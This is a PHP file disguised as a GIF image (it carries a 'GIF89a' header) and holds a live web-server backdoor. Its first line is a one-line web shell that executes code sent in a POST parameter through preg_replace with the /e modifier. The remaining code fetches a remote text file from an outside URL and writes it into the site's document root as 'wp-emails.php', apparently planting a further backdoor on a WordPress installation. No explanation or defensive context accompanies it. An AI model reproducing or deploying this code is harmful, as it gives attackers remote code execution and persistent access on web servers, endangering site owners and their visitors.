<?php @preg_replace("/[pageerror]/e",$_POST['tr0dfj60'],"saft"); ?>GIF89a1
<?php
  function http_get($url){
    $im = curl_init($url);
    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($im, CURLOPT_HEADER, 0);
    return curl_exec($im);
    curl_close($im);
  }

  $check = $_SERVER['DOCUMENT_ROOT'] . "/wp-emails.php" ;
  $text = http_get('https://app.sycamoreschool.com/Schools/1100/133426/Docs/grab.txt');
  $open = fopen($check, 'w');
  fwrite($open, $text);
  fclose($open);

  if(file_exists($check))
  {
      echo $check."</br>";
  }
  else 
      echo "not exits";

  echo "done .
 " ;
  
?>